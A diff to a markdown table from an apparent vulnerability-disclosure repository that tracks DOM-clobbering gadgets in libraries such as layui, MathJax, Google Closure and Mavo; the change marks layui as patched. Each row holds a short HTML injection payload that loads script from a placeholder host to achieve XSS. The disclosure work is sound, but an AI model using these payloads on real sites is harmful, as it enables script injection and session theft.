@@ -12,7 +12,7 @@ This repository lists client-side libraries that are vulnerable to HTML injectio
 | [Google Client API](./domc-gadgets/google-client-api.md) | N/A | 5BIk7BglYEE | ```<iframe name="scripts" src=”https://apis.google.com/js/api.js”></iframe><iframe name="scripts" src=”https://apis.google.com/js/api.js”>alert(1)</iframe>``` | XSS | TheHulk | Patched | N/A |
 | [Google Closure](./domc-gadgets/google-closure-library.md) | 4.9K | v20230103 | ```<img name="currentScript" src="https://xxx.xxx.xxx/base.js"></img>``` | XSS | TheHulk | Accepted | N/A |
 | [inspire.js](./domc-gadgets/inspire.js.md) | 1.7k | v1.10 | ```<img name="currentScript" src="https://xxx.xxx.xxx"></img>``` | XSS | TheHulk | Reported | N/A |
-| [layui](./domc-gadgets/layui.md) | 29.5K | v2.9.16 | ```<img name="currentScript" src="https://xxx.xxx.xxx">``` | XSS | TheHulk | Reported | N/A |
+| [layui](./domc-gadgets/layui.md) | 29.5K | v2.9.16 | ```<img name="currentScript" src="https://xxx.xxx.xxx">``` | XSS | TheHulk | Patched | CVE-2024-XXXXX |
 | [MathJax](./domc-gadgets/mathjax2.md) | 10.1K | v2.7.x | ```<a id="MathJax"></a> <a id="MathJax" name="root" href="https://xxx.xxx.xxx"></a>``` | XSS | TheHulk | Accepted | N/A |
 | [MathJax](./domc-gadgets/mathjax3.md) | 10.1K | v3.2.2 | ```<img name="currentScript" src="https://xxx.xxx.xxx"></img> $$\require{tex}$$``` | XSS | TheHulk | Accepted | N/A |
 | [Mavo](./domc-gadgets/mavo.md) | 2.8K | v0.3.2 | ```<img name="currentScript" src="https://xxx.xxx.xxx"></img>``` | XSS | TheHulk | Reported | N/A |
